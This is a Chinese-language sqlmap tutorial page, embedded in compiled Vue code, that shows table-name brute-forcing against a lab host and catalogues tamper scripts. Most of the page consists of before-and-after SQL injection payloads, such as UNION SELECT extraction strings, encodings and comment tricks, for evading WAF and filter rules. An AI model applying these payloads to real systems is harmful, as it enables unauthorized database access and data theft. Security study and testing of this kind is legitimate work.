</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>暴力破解的表在<code>txt/common-tables.txt</code>文件中，你可以自己添加。</p><p>列举一个MySQL 4.1的例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ python sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner

[...]
[hh:mm:39] [INFO] testing MySQL
[hh:mm:39] [INFO] confirming MySQL
[hh:mm:40] [INFO] the back-end DBMS is MySQL
[hh:mm:40] [INFO] fetching banner
web server operating system: Windows
web application technology: PHP 5.3.1, Apache 2.2.14
back-end DBMS operating system: Windows
back-end DBMS: MySQL &lt; 5.0.0
banner:&#39;4.1.21-community-nt&#39;

[hh:mm:40] [INFO] checking table existence using items from &#39;/software/sqlmap/txt/common-tables.txt&#39;
[hh:mm:40] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 8
[hh:mm:43] [INFO] retrieved: users

Database: testdb
[1 table]
+-------+
| users |
+-------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>暴力破解列名</strong></p><p>参数：<code>–common-columns</code></p><p>与暴力破解表名一样，暴力跑的列名在<code>txt/common-columns.txt</code>中。</p>`,333),u={href:"https://i.imgur.com/FXvmmee.png",target:"_blank",rel:"noopener noreferrer"},v=e("img",{src:"https://i.imgur.com/FXvmmee.png",alt:"img",tabindex:"0",loading:"lazy"},null,-1),p=e("figcaption",null,"img",-1),m=n(`<p>可以选择多线程来尝试破解。</p><h4 id="针对过滤空格的" tabindex="-1"><a class="header-anchor" href="#针对过滤空格的" aria-hidden="true">#</a> 针对过滤空格的</h4><p><strong>1:space2dash.py</strong></p><p>作用：用”– 随机字符串%0A” 替换原来的空格</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND 9227=9227&#39;
&#39;1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>原理是–n是注释，后面内容不生效，%0A为换行符，这样就可以不使用空格分隔了。</p><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MSSQL
SQLite
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>2:space2hash.py</strong></p><p>作用：空格替换为#号 随机字符串 以及换行符</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1 AND 9227=9227
2 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL
在以下版本做过测试:
MySQL 4.0, 5.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>3: space2morehash.py</strong></p><p>作用：空格替换为 #号 以及更多随机字符串 换行符（和上一条原理一致）</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1 AND 9227=9227 
1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
​\`\`\` 
版本要求: 
* MySQL &gt;= 5.1.13 Tested
针对此做过测试: 
* MySQL 5.1.41
#### space2mssqlblank.py
作用：空格替换为其它空符号
示例：
​\`\`\`sql
SELECT id FROM users 
SELECT%08id%02FROM%0Fusers
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Microsoft SQL Server
在以下版本做过测试:
Microsoft SQL Server 2000
Microsoft SQL Server 2005
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>4:space2mysqlblank.py</strong></p><p>作用：空格替换其它空白符号</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT id FROM users 
SELECT%0Bid%0BFROM%A0users
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL
在以下版本做过测试:
MySQL 5.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>5:space2mssqlhash.py</strong></p><p>作用：替换空格</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND 9227=9227&#39;
&#39;1%23%0AAND%23%0A9227=9227&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MSSQL
MySQL
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>6:modsecurityversioned.py</strong></p><p>作用：过滤空格，包含完整的查询版本注释</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND 2&gt;1--&#39;
&#39;1 /*!30874AND 2&gt;1*/--&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL
在以下版本做过测试:
MySQL 5.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>7:space2comment.py</strong></p><p>作用：<code>Replaces space character (‘ ‘) with comments ‘/**/’</code></p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT id FROM users 
SELECT//id//FROM/**/users
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Microsoft SQL Server 2005
MySQL 4, 5.0 and 5.5
Oracle 10g
PostgreSQL 8.3, 8.4, 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>8:space2mysqldash.py</strong></p><p>作用：用<code>–%0A</code>替换空格</p><p>注：之前有个<code>mssql</code>的 这个是<code>mysql</code>的</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND 9227=9227&#39;
&#39;1--%0AAND--%0A9227=9227&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL
MSSQL
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>9:space2plus.py</strong></p><p>作用：用+替换空格</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;SELECT id FROM users&#39;
&#39;SELECT+id+FROM+users&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><p>All</p><p><strong>10:bluecoat.py</strong></p><p>作用：代替空格字符后与一个有效的随机空白字符的<code>SQL</code>语句。 然后替换<code>=为like</code></p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;SELECT id FROM users where id = 1&#39;
&#39;SELECT%09id FROM users where id LIKE 1&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL 5.1, SGOS
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>11:space2randomblank.py</strong></p><p>作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;SELECT id FROM users&#39;
&#39;SELECT%0Did%0DFROM%0Ausers&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><p>All</p><p><strong>12:sp_password.py</strong></p><p>作用：追加<code>sp_password’</code>从DBMS日志的自动模糊处理的有效载荷的末尾</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND 9227=9227-- &#39;
&#39;1 AND 9227=9227-- sp_password&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求: <code>* MSSQL</code></p><h4 id="针对过滤引号的" tabindex="-1"><a class="header-anchor" href="#针对过滤引号的" aria-hidden="true">#</a> 针对过滤引号的</h4><p><strong>1:apostrophemask.py</strong></p><p>作用：用<code>utf8</code>代替单引号</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;1 AND &#39;1&#39;=&#39;1&quot;
&#39;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><p>all</p><p><strong>2:apostrophenullencode.py</strong></p><p>作用：绕过过滤双引号，替换字符和双引号。</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;1 AND &#39;1&#39;=&#39;1&quot;
&#39;1 AND %00%271%00%27=%00%271&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL 4, 5.0 and 5.5
Oracle 10g
PostgreSQL 8.3, 8.4, 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="针对过滤关键字的" tabindex="-1"><a class="header-anchor" href="#针对过滤关键字的" aria-hidden="true">#</a> 针对过滤关键字的</h4><p><strong>1:halfversionedmorekeywords.py</strong></p><p>作用：当数据库为<code>mysql</code>时绕过防火墙，每个关键字之前添加<code>mysql</code>版本评论</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;) &quot;value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL &lt; 5.1
在以下版本做过测试:
MySQL 4.0.18, 5.0.22
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>2:ifnull2ifisnull.py</strong></p><p>作用：绕过对<code>IFNULL</code>过滤。 替换类似<code>’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</code></p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;IFNULL(1, 2)&#39;
&#39;IF(ISNULL(1),2,1)&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL
SQLite (possibly)
SAP MaxDB (possibly)
在以下版本做过测试:
MySQL 5.0 and 5.5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>3:multiplespaces.py</strong></p><p>作用：围绕SQL关键字添加多个空格</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 UNION SELECT foobar&#39;
&#39;1 UNION SELECT foobar&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><p>All</p><p><strong>4:halfversionedmorekeywords.py</strong></p><p>作用：关键字前加注释</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=&#39;QDWa 
value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’=&#39;QDWa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL &lt; 5.1
在以下版本做过测试:
MySQL 4.0.18, 5.0.22
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>5:unionalltounion.py</strong></p><p>作用：替换UNION ALL SELECT UNION SELECT</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;-1 UNION ALL SELECT&#39;
&#39;-1 UNION SELECT&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求: all</p><p><strong>6:randomcomments.py</strong></p><p>作用：用/**/分割sql关键字</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>‘INSERT’
‘IN//S//ERT’
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>7:unmagicquotes.py</strong></p><p>作用：宽字符绕过 GPC addslashes</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1’ AND 1=1 
 1%bf%27 AND 1=1–%20
8:randomcase.py
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>作用：随机大小写</p><p>示例： INSERT InsERt 在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Microsoft SQL Server 2005
MySQL 4, 5.0 and 5.5
Oracle 10g
PostgreSQL 8.3, 8.4, 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="针对过滤比较符号的" tabindex="-1"><a class="header-anchor" href="#针对过滤比较符号的" aria-hidden="true">#</a> 针对过滤比较符号的</h4><p><strong>1:equaltolike.py</strong></p><p>作用：like 代替等号</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT * FROM users WHERE id=1
SELECT * FROM users WHERE id LIKE 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>2:greatest.py</strong></p><p>作用：绕过过滤’&gt;’ ,用GREATEST替换大于号。</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND A &gt; B&#39;
&#39;1 AND GREATEST(A,B+1)=A&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL 4, 5.0 and 5.5
Oracle 10g
PostgreSQL 8.3, 8.4, 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>3:between.py</strong></p><p>作用：用between替换大于号（&gt;）</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND A &gt; B--&#39;
&#39;1 AND A NOT BETWEEN 0 AND B--&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Microsoft SQL Server 2005 MySQL 4, 5.0 and 5.5
Oracle 10g
PostgreSQL 8.3, 8.4, 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="其他类型" tabindex="-1"><a class="header-anchor" href="#其他类型" aria-hidden="true">#</a> 其他类型</h4><p><strong>1:versionedmorekeywords.py</strong></p><p>作用：注释绕过</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL &gt;= 5.1.13
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>2:securesphere.py</strong></p><p>作用：追加特制的字符串</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 AND 1=1&#39;
&quot;1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><p>All</p><p><strong>3:charunicodeencode.py</strong></p><p>作用：字符串 unicode 编码</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT FIELD%20FROM TABLE
%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ASP
ASP.NET
在以下版本做过测试:
Microsoft SQL Server 2000
Microsoft SQL Server 2005
MySQL 5.1.56
PostgreSQL 9.0.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>4:charencode.py</strong></p><p>作用：url编码</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT FIELD FROM%20TABLE
%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Microsoft SQL Server 2005
MySQL 4, 5.0 and 5.5
Oracle 10g
PostgreSQL 8.3, 8.4, 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>5:appendnullbyte.py</strong></p><p>作用：在有效负荷结束位置加载零字节字符编码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>‘1 AND 1=1’
‘1 AND 1=1%00’
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Microsoft Access
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>6:chardoubleencode.py</strong></p><p>作用: 双url编码(不处理以编码的)</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT FIELD FROM%20TABLE 
%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>7:base64encode.py</strong></p><p>作用：用<code>base64</code>编码替换</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;1&#39; AND SLEEP(5)#&quot;
&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>版本要求:</p><p>all</p><p><strong>8:nonrecursivereplacement.py</strong></p><p>作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p><p>示例：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;1 UNION SELECT 2--&#39;
&#39;1 UNIOUNIONN SELESELECTCT 2--&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在以下版本做过测试:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>all
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参考资料：</p><p>sqlmap用户手册中文版：https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html</p><p>sqlmap用户手册：http://drops.xmd5.com/static/drops/tips-143.html</p>`,194);function b(g,x){const s=d("ExternalLinkIcon");return a(),l("div",null,[o,e("figure",null,[e("a",u,[v,t(s)]),p]),m])}const y=i(c,[["render",b],["__file","SQLmap.html.vue"]]);export{y as default};
